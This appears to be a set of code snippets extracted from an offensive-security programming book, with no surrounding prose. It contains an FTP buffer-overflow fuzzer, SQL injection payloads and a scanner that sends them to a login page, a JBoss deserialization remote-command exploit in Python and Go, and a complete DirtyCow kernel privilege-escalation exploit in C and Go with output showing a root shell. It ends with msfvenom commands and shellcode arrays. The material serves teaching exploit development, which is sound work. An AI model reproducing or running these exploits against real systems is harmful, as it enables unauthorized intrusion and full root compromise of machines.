["```\n>>> x = \"A\"*25\n>>> x\n'AAAAAAAAAAAAAAAAAAAAAAAAA'\n```", "```\nvar (\n        n int\n        s string\n)\nfor n = 0; n < 25; n++ {\n    s += \"A\"\n}\n```", "```\nfunc main() {\n  ❶ for i := 0; i < 2500; i++ {\n      ❷ conn, err := net.Dial(\"tcp\", \"10.0.1.20:21\")\n         if err != nil {\n          ❸ log.Fata lf(\"[!] Error at offset %d: %s\\n\", i, err)\n         }  \n      ❹ bufio.NewReader(conn).ReadString('\\n')\n\n         user := \"\"\n      ❺ for n := 0; n <= i; n++ {\n             user += \"A\"\n          }  \n\n         raw := \"USER %s\\n\"\n      ❻ fmt.Fprintf(conn, raw, user)\n         bufio.NewReader(conn).ReadString('\\n')\n\n         raw = \"PASS password\\n\"\n         fmt.Fprint(conn, raw)\n         bufio.NewReader(conn).ReadString('\\n')\n\n         if err := conn.Close()❼; err != nil {\n          ❽ log.Println(\"[!] Error at offset %d: %s\\n\", i, err)\n         }  \n    }  \n}\n```", "```\nusername = HTTP_GET[\"username\"]\nquery = \"SELECT * FROM users WHERE user = '\" + username + \"'\"\nresult = db.execute(query)\nif(len(result) > 0) {\n    return AuthenticationSuccess()\n} else {\n    return AuthenticationFailed()\n}\n```", "```\nSELECT * FROM users WHERE user = 'alice'\n```", "```\nSELECT * FROM users WHERE user = 'o'doyle'\n```", "```\nYou have an error in your SQL syntax\n```", "```\nSELECT * FROM users WHERE user = '' OR 1=1#'\n```", "```\nPOST /WebApplication/login.jsp HTTP/1.1\nHost: 10.0.1.20:8080\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:54.0) Gecko/20100101 Firefox/54.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 35\nReferer: http://10.0.1.20:8080/WebApplication/\nCookie: JSESSIONID=2D55A87C06A11AAE732A601FCB9DE571\nConnection: keep-alive\nUpgrade-Insecure-Requests: 1\n\nusername=someuser&password=somepass\n```", "```\nfunc main() {\n ❶ payloads := []string{\n        \"baseline\",\n        \")\",\n        \"(\",\n        \"\\\"\",\n        \"'\",\n    }  \n\n ❷ sqlErrors := []string{\n        \"SQL\",\n        \"MySQL\",\n        \"ORA-\",\n        \"syntax\",\n    }  \n\n    errRegexes := []*regexp.Regexp{}\n    for _, e := range sqlErrors {\n     ❸ re := regexp.MustCompile(fmt.Sprintf(\".*%s.*\", e))\n        errRegexes = append(errRegexes, re)\n    }  \n\n ❹ for _, payload := range payloads {\n        client := new(http.Client)\n    ❺ body := []byte(fmt.Sprintf(\"username=%s&password=p\", payload))\n    ❻ req, err := http.NewRequest(\n           \"POST\",\n           \"http://10.0.1.20:8080/WebApplication/login.jsp\",\n           bytes.NewReader(body),\n        )  \n        if err != nil {\n            log.Fatalf(\"[!] Unable to generate request: %s\\n\", err)\n        }  \n        req.Header.Add(\"Content-Type\", \"application/x-www-form-urlencoded\")\n        resp, err := client.Do(req)\n        if err != nil {\n            log.Fatalf(\"[!] Unable to process response: %s\\n\", err)\n        }  \n ❼ body, err = ioutil.ReadAll(resp.Body)\n        if err != nil {\n            log.Fatalf(\"[!] Unable to read response body: %s\\n\", err)\n        }  \n        resp.Body.Close()\n\n     ❽ for idx, re := range errRegexes {\n         ❾ if re.MatchString(string(body)) {\n                fmt.Printf(\n                    \"[+] SQL Error found ('%s') for payload: %s\\n\",\n                    sqlErrors[idx],\n                    payload,\n                )\n                break\n            }  \n        }  \n    }  \n}\n```", "```\n$ go run main.go\n[+] SQL Error found ('SQL') for payload: '\n```", "```\ndef jboss_attack(HOST, PORT, SSL_On, _cmd):\n    # The below code is based on the jboss_java_serialize.nasl script within Nessus\n    \"\"\"\n    This function sets up the attack payload for JBoss\n    \"\"\"\n    body_serObj = hex2raw3(\"ACED000573720032737--SNIPPED FOR BREVITY--017400\") ❶\n\n    cleng = len(_cmd)\n    body_serObj += chr(cleng) + _cmd ❷\n    body_serObj += hex2raw3(\"740004657865637571--SNIPPED FOR BREVITY--7E003A\") ❸\n\n    if SSL_On: ❹\n        webservice = httplib2.Http(disable_ssl_certificate_validation=True)\n        URL_ADDR = \"%s://%s:%s\" % ('https',HOST,PORT)\n    else:\n        webservice = httplib2.Http()\n        URL_ADDR = \"%s://%s:%s\" % ('http',HOST,PORT)\n    headers = {\"User-Agent\":\"JBoss_RCE_POC\", ❺\n            \"Content-type\":\"application/x-java-serialized-object--SNIPPED FOR BREVITY--\",\n            \"Content-length\":\"%d\" % len(body_serObj)\n        }\n    resp, content = webservice.request❻ (\n        URL_ADDR+\"/invoker/JMXInvokerServlet\",\n        \"POST\",\n        body=body_serObj,\n        headers=headers)\n    # print provided response.\n    print(\"[i] Response received from target: %s\" % resp)\n```", "```\nfunc jboss(host string, ssl bool, cmd string) (int, error) {\n    serializedObject, err := hex.DecodeString(\"ACED0005737--SNIPPED FOR BREVITY--017400\") ❶\n    if err != nil {\n        return 0, err\n    }\n    serializedObject = append(serializedObject, byte(len(cmd)))\n    serializedObject = append(serializedObject, []byte(cmd)...) ❷\n    afterBuf, err := hex.DecodeString(\"740004657865637571--SNIPPED FOR BREVITY--7E003A\") ❸\n    if err != nil {\n        return 0, err\n    }\n    serializedObject = append(serializedObject, afterBuf...)\n\n    var client *http.Client\n    var url string\n    if ssl { ❹\n        client = &http.Client{\n            Transport: &http.Transport{\n                TLSClientConfig: &tls.Config{\n                    InsecureSkipVerify: true,\n                },\n            },\n        }\n        url = fmt.Sprintf(\"https://%s/invoker/JMXInvokerServlet\", host)\n    } else {\n        client = &http.Client{}\n        url = fmt.Sprintf(\"http://%s/invoker/JMXInvokerServlet\", host)\n    }\n\n    req, err := http.NewRequest(\"POST\", url, bytes.NewReader(serializedObject))\n    if err != nil {\n        return 0, err\n    }\n    req.Header.Set( ❺\n        \"User-Agent\",\n        \"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko\")\n    req.Header.Set(\n        \"Content-Type\",\n        \"application/x-java-serialized-object; class=org.jboss.invocation.MarshalledValue\")\n resp, err := client.Do(req) ❻\n    if err != nil {\n        return 0, err\n    }\n    return resp.StatusCode, nil\n}\n```", "```\n#include <stdio.h>\n#include <stdlib.h>\n#include <sys/mman.h>\n#include <fcntl.h>\n#include <pthread.h>\n#include <string.h>\n#include <unistd.h>\nvoid *map;\nint f;\nint stop = 0;\nstruct stat st;\nchar *name;\npthread_t pth1,pth2,pth3;\n\n// change if no permissions to read\nchar suid_binary[] = \"/usr/bin/passwd\";\n\nunsigned char sc[] = {\n  0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,\n  --snip--\n  0x68, 0x00, 0x56, 0x57, 0x48, 0x89, 0xe6, 0x0f, 0x05\n};\nunsigned int sc_len = 177;\n\nvoid *madviseThread(void *arg)\n{\n    char *str;\n    str=(char*)arg;\n    int i,c=0;\n    for(i=0;i<1000000 && !stop;i++) {\n        c+=madvise(map,100,MADV_DONTNEED);\n    }\n    printf(\"thread stopped\\n\");\n}\n\nvoid *procselfmemThread(void *arg)\n{\n    char *str;\n    str=(char*)arg;\n    int f=open(\"/proc/self/mem\",O_RDWR);\n    int i,c=0;\n    for(i=0;i<1000000 && !stop;i++) {\n        lseek(f,map,SEEK_SET);\n        c+=write(f, str, sc_len);\n    }\n    printf(\"thread stopped\\n\");\n}\n\nvoid *waitForWrite(void *arg) {\n    char buf[sc_len];\n\n    for(;;) {\n        FILE *fp = fopen(suid_binary, \"rb\");\n\n        fread(buf, sc_len, 1, fp);\n\n        if(memcmp(buf, sc, sc_len) == 0) {\n            printf(\"%s is overwritten\\n\", suid_binary);\n            break;\n        }\n fclose(fp);\n        sleep(1);\n    }\n\n    stop = 1;\n\n    printf(\"Popping root shell.\\n\");\n    printf(\"Don't forget to restore /tmp/bak\\n\");\n\n    system(suid_binary);\n}\n\nint main(int argc,char *argv[]) {\n    char *backup;\n\n    printf(\"DirtyCow root privilege escalation\\n\");\n    printf(\"Backing up %s.. to /tmp/bak\\n\", suid_binary);\n\n    asprintf(&backup, \"cp %s /tmp/bak\", suid_binary);\n    system(backup);\n\n    f = open(suid_binary,O_RDONLY);\n    fstat(f,&st);\n\n    printf(\"Size of binary: %d\\n\", st.st_size);\n\n    char payload[st.st_size];\n    memset(payload, 0x90, st.st_size);\n    memcpy(payload, sc, sc_len+1);\n\n    map = mmap(NULL,st.st_size,PROT_READ,MAP_PRIVATE,f,0);\n\n    printf(\"Racing, this may take a while..\\n\");\n\n    pthread_create(&pth1, NULL, &madviseThread, suid_binary);\n    pthread_create(&pth2, NULL, &procselfmemThread, payload);\n    pthread_create(&pth3, NULL, &waitForWrite, NULL);\n\n    pthread_join(pth3, NULL);\n\n    return 0;\n}\n```", "```\n❶ void *map;\n   int f;\n❷ int stop = 0;\n   struct stat st;\n   char *name;\n   pthread_t pth1,pth2,pth3;\n\n   // change if no permissions to read\n❸ char suid_binary[] = \"/usr/bin/passwd\";\n\n❹ unsigned char sc[] = {\n     0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,\n     --snip--\n     0x68, 0x00, 0x56, 0x57, 0x48, 0x89, 0xe6, 0x0f, 0x05\n   };\n   unsigned int sc_len = 177;\n```", "```\n❶ var mapp uintptr\n❷ var signals = make(chan bool, 2)\n❸ const SuidBinary = \"/usr/bin/passwd\"\n\n❹ var sc = []byte{\n       0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,\n       --snip--\n       0x68, 0x00, 0x56, 0x57, 0x48, 0x89, 0xe6, 0x0f, 0x05,\n   }\n```", "```\nvoid *madviseThread(void *arg)\n{\n    char *str;\n    str=(char*)arg;\n    int i,c=0;\n    for(i=0;i<1000000 && !stop;i++❶) {\n        c+=madvise(map,100,MADV_DONTNEED)❷;\n    }\n    printf(\"thread stopped\\n\");\n}\n\nvoid *procselfmemThread(void *arg)\n{\n    char *str;\n    str=(char*)arg;\n    int f=open(\"/proc/self/mem\",O_RDWR);\n    int i,c=0;\n    for(i=0;i<1000000 && !stop;i++❶) {\n     ❸ lseek(f,map,SEEK_SET);\n        c+=write(f, str, sc_len)❹;\n    }\n    printf(\"thread stopped\\n\");\n}\n```", "```\nfunc madvise() {\n    for i := 0; i < 1000000; i++ {\n        select {\n        case <- signals: ❶\n            fmt.Println(\"madvise done\")\n            return\n        default:\n            syscall.Syscall(syscall.SYS_MADVISE, mapp, uintptr(100), syscall.MADV_DONTNEED) ❷\n        }\n    }\n}\n\nfunc procselfmem(payload []byte) {\n    f, err := os.OpenFile(\"/proc/self/mem\", syscall.O_RDWR, 0)\n    if err != nil {\n        log.Fatal(err)\n    }\n for i := 0; i < 1000000; i++ {\n        select {\n        case <- signals: ❶\n            fmt.Println(\"procselfmem done\")\n            return\n        default:\n            syscall.Syscall(syscall.SYS_LSEEK, f.Fd(), mapp, uintptr(os.SEEK_SET)) ❸\n            f.Write(payload) ❹\n        }\n    }\n}\n```", "```\nvoid *waitForWrite(void *arg) {\n    char buf[sc_len];\n\n ❶ for(;;) {\n        FILE *fp = fopen(suid_binary, \"rb\");\n\n        fread(buf, sc_len, 1, fp);\n\n        if(memcmp(buf, sc, sc_len) == 0) {\n            printf(\"%s is overwritten\\n\", suid_binary);\n            break;\n        }\n fclose(fp);\n        sleep(1);\n    }\n\n ❷ stop = 1;\n\n    printf(\"Popping root shell.\\n\");\n    printf(\"Don't forget to restore /tmp/bak\\n\");\n\n ❸ system(suid_binary);\n}\n```", "```\nfunc waitForWrite() {\n    buf := make([]byte, len(sc))\n ❶ for {\n        f, err := os.Open(SuidBinary)\n        if err != nil {\n            log.Fatal(err)\n        }\n        if _, err := f.Read(buf); err != nil {\n            log.Fatal(err)\n        }\n        f.Close()\n        if bytes.Compare(buf, sc) == 0 {\n            fmt.Printf(\"%s is overwritten\\n\", SuidBinary)\n            break\n        }\n        time.Sleep(1*time.Second)\n    }\n ❷ signals <- true\n    signals <- true\n\n    fmt.Println(\"Popping root shell\")\n    fmt.Println(\"Don't forget to restore /tmp/bak\\n\")\n\n    attr := os.ProcAttr {\n        Files: []*os.File{os.Stdin, os.Stdout, os.Stderr},\n    }\n    proc, err := os.StartProcess(SuidBinary, nil, &attr) ❸\n    if err !=nil {\n        log.Fatal(err)\n    }\n    proc.Wait()\n    os.Exit(0)\n}\n```", "```\nint main(int argc,char *argv[]) {\n    char *backup;\n\n    printf(\"DirtyCow root privilege escalation\\n\");\n    printf(\"Backing up %s.. to /tmp/bak\\n\", suid_binary);\n\n ❶ asprintf(&backup, \"cp %s /tmp/bak\", suid_binary);\n    system(backup);\n\n ❷ f = open(suid_binary,O_RDONLY);\n    fstat(f,&st);\n\n    printf(\"Size of binary: %d\\n\", st.st_size);\n\n ❸ char payload[st.st_size];\n    memset(payload, 0x90, st.st_size);\n    memcpy(payload, sc, sc_len+1);\n\n ❹ map = mmap(NULL,st.st_size,PROT_READ,MAP_PRIVATE,f,0);\n\n    printf(\"Racing, this may take a while..\\n\");\n\n ❺ pthread_create(&pth1, NULL, &madviseThread, suid_binary);\n    pthread_create(&pth2, NULL, &procselfmemThread, payload);\n    pthread_create(&pth3, NULL, &waitForWrite, NULL);\n\n    pthread_join(pth3, NULL);\n\n    return 0;\n}\n```", "```\nfunc main() {\n    fmt.Println(\"DirtyCow root privilege escalation\")\n    fmt.Printf(\"Backing up %s.. to /tmp/bak\\n\", SuidBinary)\n\n  ❶ backup := exec.Command(\"cp\", SuidBinary, \"/tmp/bak\")\n     if err := backup.Run(); err != nil {\n         log.Fatal(err)\n     }\n\n  ❷ f, err := os.OpenFile(SuidBinary, os.O_RDONLY, 0600)\n     if err != nil {\n         log.Fatal(err)\n     }\n     st, err := f.Stat()\n     if err != nil {\n         log.Fatal(err)\n     }\n\n     fmt.Printf(\"Size of binary: %d\\n\", st.Size())\n\n  ❸ payload := make([]byte, st.Size())\n     for i, _ := range payload {\n         payload[i] = 0x90\n     }\n     for i, v := range sc {\n         payload[i] = v\n     }\n\n  ❹ mapp, _, _ = syscall.Syscall6(\n        syscall.SYS_MMAP,\n        uintptr(0),\n        uintptr(st.Size()),\n        uintptr(syscall.PROT_READ),\n        uintptr(syscall.MAP_PRIVATE),\n        f.Fd(),\n        0,\n     )\n\n     fmt.Println(\"Racing, this may take a while..\\n\")\n  ❺ go madvise()\n     go procselfmem(payload)\n     waitForWrite()\n}\n```", "```\nvar mapp uintptr\nvar signals = make(chan bool, 2)\nconst SuidBinary = \"/usr/bin/passwd\"\n\nvar sc = []byte{\n    0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,\n    --snip--\n    0x68, 0x00, 0x56, 0x57, 0x48, 0x89, 0xe6, 0x0f, 0x05,\n}\n\nfunc madvise() {\n    for i := 0; i < 1000000; i++ {\n        select {\n        case <- signals:\n            fmt.Println(\"madvise done\")\n            return\n        default:\n            syscall.Syscall(syscall.SYS_MADVISE, mapp, uintptr(100), syscall.MADV_DONTNEED)\n        }\n    }\n}\n\nfunc procselfmem(payload []byte) {\n    f, err := os.OpenFile(\"/proc/self/mem\", syscall.O_RDWR, 0)\n    if err != nil {\n        log.Fatal(err)\n    }\n    for i := 0; i < 1000000; i++ {\n        select {\n        case <- signals:\n            fmt.Println(\"procselfmem done\")\n            return\n        default:\n            syscall.Syscall(syscall.SYS_LSEEK, f.Fd(), mapp, uintptr(os.SEEK_SET))\n f.Write(payload)\n        }\n    }\n}\n\nfunc waitForWrite() {\n    buf := make([]byte, len(sc))\n    for {\n        f, err := os.Open(SuidBinary)\n        if err != nil {\n            log.Fatal(err)\n        }\n        if _, err := f.Read(buf); err != nil {\n            log.Fatal(err)\n        }\n        f.Close()\n        if bytes.Compare(buf, sc) == 0 {\n            fmt.Printf(\"%s is overwritten\\n\", SuidBinary)\n            break\n        }\n        time.Sleep(1*time.Second)\n    }\n    signals <- true\n    signals <- true\n\n    fmt.Println(\"Popping root shell\")\n    fmt.Println(\"Don't forget to restore /tmp/bak\\n\")\n\n    attr := os.ProcAttr {\n        Files: []*os.File{os.Stdin, os.Stdout, os.Stderr},\n    }\n    proc, err := os.StartProcess(SuidBinary, nil, &attr)\n    if err !=nil {\n        log.Fatal(err)\n    }\n    proc.Wait()\n    os.Exit(0)\n}\n\nfunc main() {\n    fmt.Println(\"DirtyCow root privilege escalation\")\n    fmt.Printf(\"Backing up %s.. to /tmp/bak\\n\", SuidBinary)\n\n    backup := exec.Command(\"cp\", SuidBinary, \"/tmp/bak\")\n    if err := backup.Run(); err != nil {\n        log.Fatal(err)\n    }\n\n    f, err := os.OpenFile(SuidBinary, os.O_RDONLY, 0600)\n    if err != nil {\n        log.Fatal(err)\n    }\n    st, err := f.Stat()\n    if err != nil {\n log.Fatal(err)\n    }\n\n    fmt.Printf(\"Size of binary: %d\\n\", st.Size())\n\n    payload := make([]byte, st.Size())\n    for i, _ := range payload {\n        payload[i] = 0x90\n    }\n    for i, v := range sc {\n        payload[i] = v\n    }\n\n    mapp, _, _ = syscall.Syscall6(\n        syscall.SYS_MMAP,\n        uintptr(0),\n        uintptr(st.Size()),\n        uintptr(syscall.PROT_READ),\n        uintptr(syscall.MAP_PRIVATE),\n        f.Fd(),\n        0,\n    )\n\n    fmt.Println(\"Racing, this may take a while..\\n\")\n    go madvise()\n    go procselfmem(payload)\n    waitForWrite()\n}\n```", "```\nalice@ubuntu:~$ go run main.go\nDirtyCow root privilege escalation\nBacking up /usr/bin/passwd.. to /tmp/bak\nSize of binary: 47032\nRacing, this may take a while..\n\n/usr/bin/passwd is overwritten\nPopping root shell\nprocselfmem done\nDon't forget to restore /tmp/bak\n\nroot@ubuntu:/home/alice# id\nuid=0(root) gid=1000(alice) groups=0(root),4(adm),1000(alice)\n```", "```\nunsigned char buf[] =\n\"\\xfc\\xe8\\x82\\x00\\x00\\x00\\x60\\x89\\xe5\\x31\\xc0\\x64\\x8b\\x50\\x30\"\n\"\\x8b\\x52\\x0c\\x8b\\x52\\x14\\x8b\\x72\\x28\\x0f\\xb7\\x4a\\x26\\x31\\xff\"\n--snip--\n\"\\x64\\x00\";\n```", "```\npayload := []byte(\"\\xfc\\xe8\\x82...\").\n```", "```\nfce8820000006089e531c0648b50308b520c8b52148b72280fb74a2631ff...6400\n```", "```\npayload, err := hex.DecodeString(\"fce8820000006089e531c0648b50308b520c8b52148b\n72280fb74a2631ff...6400\")\n```", "```\n0xfc, 0xe8, 0x82, 0x00, 0x00, 0x00, 0x60, 0x89, 0xe5, 0x31, 0xc0, 0x64, 0x8b, 0x50, 0x30,\n0x8b, 0x52, 0x0c, 0x8b, 0x52, 0x14, 0x8b, 0x72, 0x28, 0x0f, 0xb7, 0x4a, 0x26, 0x31, 0xff,\n--snip--\n0x64, 0x00\n```", "```\npayload := []byte{\n    0xfc, 0xe8, 0x82, 0x00, 0x00, 0x00, 0x60, 0x89, 0xe5, 0x31, 0xc0, 0x64, 0x8b, 0x50, 0x30,\n    0x8b, 0x52, 0x0c, 0x8b, 0x52, 0x14, 0x8b, 0x72, 0x28, 0x0f, 0xb7, 0x4a, 0x26, 0x31, 0xff,\n    --snip--\n    0x64, 0x00,\n}\n```", "```\nÐÐÐ`ÐÐ1ÐdÐP0ÐR\nÐ8ÐuÐ}Ð;}$uÐXÐX$ÐfÐY IÐ:IÐ4ÐÐ1ÐÐÐÐ\n```", "```\n$ msfvenom -p [payload] [options] - f raw | xxd -i\n```", "```\n$ msfvenom -p [payload] [options] - f raw | base64\n```", "```\n$ msfvenom -p [payload] [options] - f raw | base64 | tr -d \"\\n\"\n```", "```\npayload, err := base64.StdEncoding.DecodeString(\"/OiCAAAAYInlMcBki1Awi...WFuZAA=\")\n```"]